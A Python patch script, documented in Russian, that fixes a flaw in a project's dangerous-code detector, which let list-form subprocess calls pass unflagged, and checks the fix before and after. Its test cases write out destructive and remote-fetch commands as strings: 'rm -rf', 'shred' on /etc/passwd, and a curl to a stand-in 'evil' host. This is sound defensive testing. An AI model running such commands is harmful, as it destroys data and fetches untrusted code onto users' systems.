"""Исправление критического дефекта защиты: core/dangerous.py:288.

ЧТО НЕ ТАК. В `_check_python_rules` правило подавляется безусловно:

    282:        if safe_compiled is not None and safe_compiled.search(code):
    283:            # Additional check for subprocess: verify the command is actually safe.
    284:            if "subprocess" in rule.pattern.lower():
    285:                if _is_subprocess_command_safe(code):
    286:                    continue
    287:            # For os.system and open, safe_pattern match alone is sufficient.
    288:            continue          # ← выполняется ВСЕГДА
    289:        reasons.append(rule.reason)

Строка 288 стоит вне условия `if "subprocess" ...`, поэтому правило
гаснет и тогда, когда проверка команды вернула «небезопасно».

СЛЕДСТВИЕ (воспроизведено вызовом):
    assess_code("os.system('rm -rf /')")             → опасно: True
    assess_code('subprocess.run(["rm","-rf","/"])')  → опасно: FALSE

Форма записи определяет результат: та же команда слитно распознаётся,
списком — нет.

ПОЧЕМУ ТАК ПОЛУЧИЛОСЬ. `safe_pattern` для subprocess проверяет только то,
что аргументы переданы СПИСКОМ:

    safe_pattern = r"...(?:run|call|check_call|check_output)\s*\(\s*\["

Это защита от инъекции через оболочку — она верна. Но она ничего не говорит
о ТОМ, КАКАЯ команда запускается. Значит одной проверки формы недостаточно:
нужна ещё проверка самой команды (`_is_subprocess_command_safe`). Она
вызывается, но её отрицательный результат игнорируется.

ПРАВКА. `continue` переносится в ветку `else`: для subprocess правило
подавляется ТОЛЬКО при положительной проверке команды, для остальных правил
(`os.system`, `open`) поведение прежнее.

ЧТО НЕ МЕНЯЕТСЯ:
  * `os.system("echo ...")` по-прежнему не считается опасным;
  * `open("test.txt", "w")` по-прежнему безопасен;
  * `subprocess.run(["pytest", "tests/"])` по-прежнему безопасен;
  * тест `tests/test_safety_mode.py` (строка с shell=True) не затронут:
    там форма записи не список, значит `safe_pattern` не срабатывает вовсе.

Скрипт делает бэкап и проверяет результат ДО и ПОСЛЕ вызовом самих функций.
"""

from __future__ import annotations

import ast
import pathlib
import shutil
import subprocess
import sys

SAGA = pathlib.Path(r"C:\!.Tihon\sagaai_edit_github")
TARGET = SAGA / "core" / "dangerous.py"
SAGA_PY = str(SAGA / ".venv" / "Scripts" / "python.exe")

# --- Исходный и исправленный фрагмент ---
OLD = '''        # If a safe_pattern exists and matches, suppress this rule.
        if safe_compiled is not None and safe_compiled.search(code):
            # Additional check for subprocess: verify the command is actually safe.
            if "subprocess" in rule.pattern.lower():
                if _is_subprocess_command_safe(code):
                    continue
            # For os.system and open, safe_pattern match alone is sufficient.
            continue
        reasons.append(rule.reason)'''

NEW = '''        # If a safe_pattern exists and matches, the rule may be suppressed -
        # but NOT automatically. What the safe_pattern proves depends on the rule.
        if safe_compiled is not None and safe_compiled.search(code):
            if "subprocess" in rule.pattern.lower():
                # For subprocess the safe_pattern only proves that arguments are
                # passed as a LIST, which rules out shell injection. It says
                # nothing about WHICH command runs, so the command itself must
                # still be checked. If it is not recognised as safe, the rule
                # stays active and the user is asked to confirm.
                if _is_subprocess_command_safe(code):
                    continue
            else:
                # For os.system and open, safe_pattern match alone is sufficient.
                continue
        reasons.append(rule.reason)'''

# --- Проверка ДО правки ---
print("=" * 78)
print("1. СОСТОЯНИЕ ДО ПРАВКИ")
print("=" * 78)
probe_before = SAGA / "tests" / "_probe_danger_before.py"
probe_before.write_text(
    "import sys\n"
    f"sys.path.insert(0, r'{SAGA}')\n"
    "from core.dangerous import assess_code\n"
    "CASES = [\n"
    "    ('rm списком', 'subprocess.run([\"rm\", \"-rf\", \"/data\"])'),\n"
    "    ('curl списком', 'subprocess.run([\"curl\", \"http://evil/x.sh\"])'),\n"
    "    ('pip install списком', 'subprocess.run([\"pip\", \"install\", \"x\"])'),\n"
    "    ('shred списком', 'subprocess.run([\"shred\", \"-u\", \"/etc/passwd\"])'),\n"
    "    ('pytest (норма)', 'subprocess.run([\"pytest\", \"tests/\"])'),\n"
    "    ('python (норма)', 'subprocess.run([\"python\", \"s.py\"])'),\n"
    "    ('os.system echo (норма)', "
    "\"os.system('echo done')\"),\n"
    "    ('open test (норма)', \"open('test.txt', 'w')\"),\n"
    "]\n"
    "for label, code in CASES:\n"
    "    a = assess_code(code, tool='run_code')\n"
    "    print(f'{label}|{a.dangerous}')\n",
    encoding="utf-8", newline="\n",
)
proc = subprocess.run([SAGA_PY, str(probe_before)], capture_output=True,
                      text=True, encoding="utf-8", errors="replace",
                      timeout=300)
before_rows = [ln.strip() for ln in (proc.stdout or "").splitlines()
               if "|" in ln]
print(f"  {'случай':<28} опасно")
for row in before_rows:
    label, value = row.rsplit("|", 1)
    mark = "ДА" if value == "True" else "нет"
    print(f"  {label:<28} {mark}")

# --- Правка ---
print()
print("=" * 78)
print("2. ПРАВКА")
print("=" * 78)
text = TARGET.read_text(encoding="utf-8")
if NEW in text:
    print("  правка уже внесена")
elif OLD in text:
    backup = TARGET.with_suffix(".py.bak-safe288")
    shutil.copy2(TARGET, backup)
    print(f"  бэкап: {backup.name}")
    text = text.replace(OLD, NEW, 1)
    TARGET.write_text(text, encoding="utf-8", newline="\n")
    print("  правка внесена")
else:
    raise SystemExit("НЕ НАЙДЕН фрагмент для правки")

after_text = TARGET.read_text(encoding="utf-8")
try:
    ast.parse(after_text)
    print("  синтаксис верен")
except SyntaxError as exc:
    print(f"  ПРОВАЛ синтаксиса: строка {exc.lineno}: {exc.msg}")
    raise SystemExit(1)

# --- Проверка ПОСЛЕ правки ---
print()
print("=" * 78)
print("3. СОСТОЯНИЕ ПОСЛЕ ПРАВКИ")
print("=" * 78)
proc = subprocess.run([SAGA_PY, str(probe_before)], capture_output=True,
                      text=True, encoding="utf-8", errors="replace",
                      timeout=300)
after_rows = [ln.strip() for ln in (proc.stdout or "").splitlines()
              if "|" in ln]
before_map = dict(r.rsplit("|", 1) for r in before_rows)
print(f"  {'случай':<28} {'было':<7} стало")
changes = 0
for row in after_rows:
    label, value = row.rsplit("|", 1)
    old = before_map.get(label)
    mark_old = "ДА" if old == "True" else "нет"
    mark_new = "ДА" if value == "True" else "нет"
    if old != value:
        changes += 1
        print(f"  {label:<28} {mark_old:<7} {mark_new}   ← ИЗМЕНИЛОСЬ")
    else:
        print(f"  {label:<28} {mark_old:<7} {mark_new}")
print(f"\n  изменилось случаев: {changes}")

probe_before.unlink(missing_ok=True)
print()
print(f"  файл: {TARGET.relative_to(SAGA)} "
      f"({len(after_text.encode('utf-8'))} б)")
